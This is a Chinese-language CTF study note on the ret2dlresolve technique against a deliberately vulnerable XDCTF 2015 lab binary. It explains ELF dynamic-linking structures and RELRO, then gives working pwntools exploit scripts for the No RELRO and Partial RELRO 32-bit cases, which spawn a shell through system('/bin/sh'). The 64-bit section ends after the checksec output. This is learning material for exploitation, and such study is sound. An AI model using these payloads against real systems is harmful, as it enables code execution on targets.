# PWN Exercise - ret2dlresolve

## 准备
### dl-resolve
- [[新手向]ret2dl-resolve详解](https://bbs.pediy.com/thread-227034.htm)

ELF:   
>`.dynamic`   
这个section的用处就是他包含了很多动态链接所需的关键信息，我们现在只关心`DT_STRTAB`, `DT_SYMTAB`, `DT_JMPREL`这三项，这三个东西分别包含了指向.`dynstr`, `.dynsym`, .`rel.plt`这3个section的指针。 `readelf -S` (Section Headers)

>`.dynstr`
一个字符串表，index为0的地方永远是0，然后后面是动态链接所需的字符串，0结尾，包括导入函数名，比方说这里很明显有个puts。到时候，相关数据结构引用一个字符串时，用的是相对这个section头的偏移。

>`.dynsym`
是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。我们这里只关心函数符号，比方说上面的puts。结构体定义如下:
```
typedef struct
{
  Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了
  Elf32_Addr    st_value;
  Elf32_Word    st_size;
  unsigned char st_info; //对于导入函数符号而言，它是0x12
  unsigned char st_other;
  Elf32_Section st_shndx;
}Elf32_Sym; //对于导入函数符号而言，其他字段都是0
```
>`.rel.plt`
是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下：
```
typedef struct
{
  Elf32_Addr    r_offset; //指向GOT表的指针
  Elf32_Word    r_info;
  //一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)>>8)，忽略那个07
  //1和3是这个导入函数的符号在.dynsym中的下标，
  //如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应
} Elf32_Rel;
```

在 Linux 中，程序使用 `_dl_runtime_resolve(link_map_obj, reloc_offset)` 来对动态链接的函数进行重定位。那么如果我们可以控制相应的参数及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。这也是 ret2dlresolve 攻击的核心所在。   
具体的，动态链接器在解析符号地址时所使用的重定位表项、动态符号表、动态字符串表都是从目标文件中的动态节 .dynamic 索引得到的。所以如果我们能够修改其中的某些内容使得最后动态链接器解析的符号是我们想要解析的符号，那么攻击就达成了。   

>`_dl_runtime_resolve(link_map_obj, reloc_offset)` 执行流程:   
1. 用`link_map`访问`.dynamic`，取出`.dynstr`, `.dynsym`, .`rel.plt`的指针
2. `.rel.plt` + 第二个参数求出当前函数的重定位表项`Elf32_Rel`的指针，记作rel
3. `rel->r_info >> 8`作为`.dynsym`的下标，求出当前函数的符号表项`Elf32_Sym`的指针，记作sym
4. `.dynstr + sym->st_name`得出符号名字符串指针
5. 在动态链接库查找这个函数的地址，并且把地址赋值给`*rel->r_offset`，即GOT表
6. 调用这个函数

### 利用思路
1. 改写`.dynamic`的`DT_STRTAB`:checksec时No RELRO可行，即.dynamic可写。因为ret2dl-resolve会从.dynamic里面拿.dynstr字符串表的指针，然后加上offset取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够改写这个指针到一块我们能够操纵的内存空间，当resolve的时候，就能resolve成我们所指定的任意库函数。比方说，原本是一个free函数，我们就把原本是free字符串的那个偏移位置设为system字符串，第一次调用`free("bin/sh")`（因为只有第一次才会resolve），就等于调用了`system("/bin/sh")`。
2. 控制`_dl_runtime_resolve(link_map_obj, reloc_offset)`第二个参数，指向我们所构造的Elf32_Rel。在`.dynamic`不可写的情况下采用。   
3. 伪造 `link_map`：由于动态连接器在解析符号地址时，主要依赖于 `link_map` 来查询相关的地址。因此，如果我们可以成功伪造 link_map，也就可以控制程序执行目标函数。

### 保护机制
RELRO 全名為 RELocation Read Only。共有三種保护模式，分別為 No / Partial / Full。

- No RELRO - Link Map、GOT 可写
- Partial RELRO - Link Map 不可写、GOT 可写
- Full RELRO - Link Map、GOT 皆不可写

### pwntools ROP链生成器
```python
elf = ELF('ropasaurusrex')
rop = ROP(elf)
rop.read(0, elf.bss(0x80))
rop.dump()
# ['0x0000:        0x80482fc (read)',
#  '0x0004:       0xdeadbeef',
#  '0x0008:              0x0',
#  '0x000c:        0x80496a8']
str(rop)
# '\xfc\x82\x04\x08\xef\xbe\xad\xde\x00\x00\x00\x00\xa8\x96\x04\x08'
```
使用ROP(elf)来产生一个rop的对象，这时rop链还是空的，需要在其中添加函数。

因为ROP对象实现了getattr的功能，可以直接通过func call的形式来添加函数，rop.read(0, elf.bss(0x80))实际相当于rop.call('read', (0, elf.bss(0x80)))。
通过多次添加函数调用，最后使用str将整个rop chain dump出来就可以了。

- call(resolvable, arguments=()) : 添加一个调用，resolvable可以是一个符号，也可以是一个int型地址，注意后面的参数必须是元组否则会报错，即使只有一个参数也要写成元组的形式(在后面加上一个逗号)
- chain() : 返回当前的字节序列，即payload
- dump() : 直观地展示出当前的rop chain
- raw() : 在rop chain中加上一个整数或字符串
- search(move=0, regs=None, order=’size’) : 按特定条件搜索gadget
- unresolve(value) : 给出一个地址，反解析出符号

ref:https://www.jianshu.com/p/355e4badab50

## No RELRO - 32
Ref:2015-XDCTF-pwn200

`gcc -fno-stack-protector -m32 -z norelro -no-pie pwn5.c -o norelro_32`   

源码:   
```c
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln()
{
    char buf[100];
    setbuf(stdin, buf);
    read(0, buf, 256);
}
int main()
{
    char buf[100] = "Welcome to XDCTF2015~!\n";

    setbuf(stdout, buf);
    write(1, buf, strlen(buf));
    vuln();
    return 0;
}
```
### 题目
checksec   
```
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
在这种情况下，修改 .dynamic 会简单些。因为我们只需要修改 .dynamic 节中的字符串表的地址为伪造的字符串表的地址，并且相应的位置为目标字符串基本就行了。具体思路如下   

1. 修改 .dynamic 节中字符串表的地址为伪造的地址
2. 在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。
3. 在特定的位置读取 /bin/sh 字符串。
4. 调用 read 函数的 plt 的第二条指令，重新触发 _dl_runtime_resolve 进行函数解析，从而执行 system 函数。

### EXP
```python
from pwn import *
context(arch='i386',log_level='debug')
elf = ELF('norelro_32')
io = process(elf.path)
rop = ROP('norelro_32')

#gdb.attach(io,"b * 0x080484fe")
payload = flat(['a'*0x6c+'bbbb'])
rop.raw(payload)
# modify .dynstr pointer in .dynamic section to a specific location
DT_STRTAB_addr = 0x08049794 + 4
rop.read(0,DT_STRTAB_addr,4) # read - 1 
# construct a fake dynstr section
dynstr_data = elf.get_section_by_name('.dynstr').data()
fake_dynstr_data = dynstr_data.replace(b"read",b"system")
print('dynstr',fake_dynstr_data)
print('dynstr len',len(fake_dynstr_data))
blank_addr = 0x8049890
blank2_addr = 0x8049890+0x100 
bin_sh_str = "/bin/sh\x00" 
rop.read(0,blank_addr,len((fake_dynstr_data))) # read - 2
rop.read(0,blank2_addr,len(bin_sh_str)) # read - 3
read_plt_push_jmp_addr = 0x08048386
rop.raw(read_plt_push_jmp_addr) #push 8;jmp  sub_8048360;
rop.raw('bbbb')
rop.raw(blank2_addr) #/bin/sh
print(rop.dump())

io.recvuntil('Welcome to XDCTF2015~!')
io.send(rop.chain())
io.send(p32(blank_addr))
io.send(fake_dynstr_data)
io.send(bin_sh_str)
io.interactive()

```

## Partial RELRO -32

### 题目
编译：   
`gcc -fno-stack-protector -m32 -z relro -z lazy -no-pie pwn5.c -o partial_relro_32`

checksec
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
### 思路
Partial RELRO，ELF 文件中的 .dynamic 节将会变成只读的，这时我们可以控制`_dl_runtime_resolve(link_map_obj, reloc_offset)`第二个参数，指向我们所构造的Elf32_Rel。   
`_dl_runtime_resolve`执行第2步骤：
>`.rel.plt` + 第二个参数`reloc_offset`求出当前函数的重定位表项Elf32_Rel的指针，记作rel

这个时候并没有检测`.rel.plt` + 第二个参数`reloc_offset` 是否越界，以我们能给一个很大的`.rel.plt`的offset（64位的话就是下标），然后使得加上去之后的地址指向我们所能操纵的一块内存空间，比方说.bss。
`_dl_runtime_resolve`执行第3步骤：
>`rel->r_info >> 8`作为`.dynsym`的下标，求出当前函数的符号表项`Elf32_Sym`的指针，记作sym

所以在我们所伪造的`Elf32_Rel`，需要放一个`r_info`字段，大概长这样就行0xXXXXXX07，其中XXXXXX是相对.dynsym表的下标，注意不是偏移，所以是偏移除以Elf32_Sym的大小，即除以0x10（32位下）。然后这里同样也没有进行越界访问的检查，所以可以用类似的方法，伪造出这个Elf32_Sym。至于为什么是07，因为这是一个导入函数，而导入函数一般都是07，所以写成07就好。

`_dl_runtime_resolve`执行第4步骤：
>`.dynstr + sym->st_name`得出符号名字符串指针。

即为我们控制的符号名

### PWN
#### 手工构造：
```python
from pwn import *
context(log_level='debug')
elf = ELF('partial_relro_32')
io = process(elf.path)
rop = ROP('partial_relro_32')

fake_rel_addr = bss_blank_addr = 0x0804A050

# 准备构造fake Elf32_Rel(dynsym表项)-计算偏移
fake_sym_addr = bss_blank_addr + 8
sym_table_addr = 0x080481D8
sizeof_sym = 0x10
fake_sym_table_idx = (((fake_sym_addr-sym_table_addr)//sizeof_sym) <<8) + 7
# 准备构造fake Elf32_Sym(dynstr表项)-计算偏移
str_table_addr = 0x08048278
system_addr = fake_sym_addr + 0x10
bin_sh_addr = system_addr + 7
fake_str_offset = system_addr - str_table_addr

# 构造fake Elf32_Rel
read_got_addr = elf.got['read']
fake_Elf32_Rel = p32(read_got_addr)
fake_Elf32_Rel += p32(fake_sym_table_idx)

# 构造fake Elf32_Sym
fake_Elf32_Sym = p32(fake_str_offset)
fake_Elf32_Sym += p32(0)
fake_Elf32_Sym += p32(0)
fake_Elf32_Sym += p8(0x12) + p8(0) + p16(0)

strings_system_bin_sh = b"system\x00/bin/sh\x00"

# resolve的PLT，push link_map的位置
dyn_resolve_plt_addr = 0x08048380
# fake rel表项的偏移
rel_addr = 0x08048330 
fake_rel_offset = fake_rel_addr - rel_addr

fake_data = fake_Elf32_Rel + fake_Elf32_Sym + strings_system_bin_sh

payload = flat(['a'*0x6c+'bbbb'])
rop.raw(payload)
rop.read(0,bss_blank_addr,len(fake_data))
rop.raw(p32(dyn_resolve_plt_addr))
rop.raw(p32(fake_rel_offset))
rop.raw('cccc')
rop.raw(p32(bin_sh_addr))

io.recvuntil('Welcome to XDCTF2015~!')
io.send(rop.chain())
io.send(fake_data)
io.interactive()

```
pwntools 自带的模块：
```python
from pwn import *
context.binary = elf = ELF("partial_relro_32")
io = process("partial_relro_32")
rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])
# pwntools will help us choose a proper addr
# https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237
rop.read(0,dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
io.recvuntil("Welcome to XDCTF2015~!\n")
payload = flat({112:raw_rop,256:dlresolve.payload})
io.sendline(payload)
io.interactive()
```

## No RELRO - 64
## 题目
`gcc -fno-stack-protector  -z norelro -no-pie pwn5.c -o norelro_64`   
checksec
```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```